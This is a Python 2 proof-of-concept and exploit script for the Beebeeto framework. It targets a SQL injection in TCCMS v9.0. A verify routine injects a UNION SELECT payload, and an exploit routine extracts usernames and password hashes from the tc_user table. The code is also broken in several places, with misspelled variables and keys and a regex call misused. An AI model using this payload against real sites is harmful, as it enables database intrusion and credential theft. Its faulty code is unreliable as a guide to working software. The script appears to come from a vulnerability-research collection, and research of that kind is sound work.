#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame



class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0150',
            'name': 'TCCMS v9.0 /system/core/controller.class.php SQL注入漏洞 POC & Exploit',
            'author': 'jwong',
            'create_date': '2014-11-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'TCCMS',
            'vul_version': ['9.0'],
            'type': 'SQL Injection',
            'tag': ['TCCMS漏洞', 'SQL注入', '/system/core/controller.class.php', 'php'],
            'desc': 'TCCMS V9.0.20140818 /system/core/controller.class.php文件存在SQL注入漏洞。',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-072625',
            ],
        },
    }

   
    @classmethod
    def verify(cls, args):
        payload = ("1%20union%20select%20md5(32187),2,"
            "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,"
            "27,28,29%20from%20tc_user%20where%20id=1%23")
        verify_url = args['options']['target'] + '/index.php?ac=news_all&yz=1' + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'd97abcf66ea8d5818ebf5eb128f0de13' in content:
            args['success'] = True
            args['poc_ret']['vul_url']= arg['optinons']['target']
            return args
        return args


    def exploit(cls,args):
        payload = ("1%20union%20select%20group_concat(username,0x23,password),2,"
            "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,"
            "27,28,29%20from%20tc_user%20where%20id=1%23")
        verify_url = args['options']['target'] + '/index.php?ac=news_all&yz=1' + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        pattern = re.findall(r".*?<id>\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*</id>", re.I|re.S)
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        username = match.group("usrename")
        password = match.group("password")
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        args['poc_ret']['Username']['Username'] = username
        args['poc_ret']['Password']['Password'] = password
        return args

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())